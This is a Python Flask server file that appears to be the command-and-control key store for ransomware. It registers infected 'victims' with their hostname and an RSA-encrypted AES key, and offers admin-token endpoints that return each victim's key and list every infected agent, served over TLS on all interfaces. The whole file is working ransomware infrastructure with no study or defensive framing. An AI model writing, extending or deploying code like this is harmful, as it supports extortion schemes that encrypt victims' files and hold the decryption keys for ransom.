from flask import Flask, request, jsonify
from datetime import datetime
import ssl
import json
from src.common.config import ADMIN_TOKEN
from .key_store import store_agent, get_agent, get_all_agents

app = Flask(__name__)


@app.route("/register", methods=["POST"])
def register():
    data = request.get_json()
    victim_id = data.get("victim_id")
    if not victim_id:
        return "Missing victim_id", 400
    store_agent(victim_id, {
        "rsa_encrypted_aes_key": data.get("rsa_encrypted_aes_key"),
        "hostname": data.get("hostname"),
        "timestamp": data.get("timestamp")
    })
    return jsonify({"status": "registered"}), 200

@app.route("/getkey/<victim_id>", methods=["GET"])
def get_key(victim_id):
    token = request.headers.get("Admin-Token")
    if token != ADMIN_TOKEN:
        return "Unauthorized", 403
    agent = get_agent(victim_id)
    if not agent:
        return "Not found", 404
    return jsonify({"aes_key": agent["rsa_encrypted_aes_key"]})

@app.route("/status", methods=["GET"])
def status():
    token = request.headers.get("Admin-Token")
    if token != ADMIN_TOKEN:
        return "Unauthorized", 403
    return jsonify(get_all_agents())

from pathlib import Path
import ssl

BASE_DIR = Path(__file__).resolve().parent
CERT_DIR = BASE_DIR / "certs"

cert_file = CERT_DIR / "cert.pem"
key_file = CERT_DIR / "key.pem"

if __name__ == "__main__":
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=str(cert_file), keyfile=str(key_file))

    app.run(host="0.0.0.0", port=5000, ssl_context=context)
